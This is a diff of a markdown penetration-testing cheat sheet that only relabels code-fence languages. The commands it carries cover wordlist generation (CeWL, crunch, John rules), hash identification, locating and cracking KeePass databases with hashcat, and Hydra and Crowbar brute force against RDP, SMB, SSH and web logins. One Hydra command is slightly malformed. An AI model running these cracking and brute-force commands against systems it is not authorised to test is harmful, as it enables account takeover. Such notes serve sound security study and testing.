@@ -3,7 +3,7 @@
 ### Cewl - Custom Word List generator
 
 -> generating wordlist based on information from a website
-```
+```bash
 cewl <domain> -w wordlist.txt
 ```
 
@@ -15,29 +15,29 @@ cewl <domain> -w wordlist.txt
 `^ = Special characters including space`  
 
 -> Usage
-```
+```bash
 ./crunch <min-len> <max-len> [charset]
 ```
 
 -> basic examples
-```
+```bash
 crunch 9 9 -t ,@@@@^%%%
 ```
-```
+```bash
 crunch 4 6 0123456789abcdef -o wordlist.txt
 ```
 
 ### John Mutation
 -> Add the rules you want in the /etc/john/john.conf file inside the rules module [List.Rules:Wordlist] to modify your wordlists  
 -> basic rule example `$@$[1-2]$[0-9]$[0-9]$[0-9]`
-```
+```bash
 john --wordlist=wordlist.txt --rules --stdout > mutated.txt
 ```
 https://www.openwall.com/john/doc/RULES.shtml
 
 ## Cracking Password
 ### Identifying Hash Type
-```
+```bash
 hashid <hash>
 ```
 https://www.tunnelsup.com/hash-analyzer/
@@ -59,52 +59,52 @@ https://hashes.com/en/tools/hash_identifier
 
 ### Password Manager
 -> Search KeePass database files
-```
+```powershell
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 ```
 
 -> Hashing the .kdbx file
-```
+```linux
 keepass2john Database.kdbx > keepass.hash   
 ```
 
 -> Finding Hash-Mode ID of hashcat
-```
+```linux
 hashcat --help | grep -i "KeePass"
 ```
 
 -> Cracking
-```
+```linux
 hashcat -m 13400 keepass.hash
 ```
 
 ## Brute Force Attacks
 ### RDP Brute Force - Hydra
-```
+```powershell
 hydra -L /usr/share/wordlists/rockyou.txt t -p "<password" rdp://<IP>
 ```
 
 ### RDP Brute Force - Crowbar
-```
+```linux
 crowbar -b rdp -s X.X.X.X/32 -u admin -C /usr/share/wordlists/rockyou.txt -n 1
 ```
 
 ### SMB Brute Force - Hydra
-```
+```linux
 hydra -L /root/Desktop/user.txt -P /usr/share/wordlists/rockyou.txt <IP> smb
 ```
 
 ### SSH Brute Force - Hydra
-```
+```linux
 hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<IP>
 ```
 
 ### HTTP POST Login Form Brute Force - Hydra
-```
+```linux
 hydra -l <user> -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/login.php:user=admin&pass=^PASS^:Invalid Login" -vV -f
 ```
 
 ### HTTP GET Login Form Brute Force - Hydra
-```
+```linux
 hydra -l <username> -P /usr/share/wordlists/rockyou.txt -f <IP> http-get /login
 ```
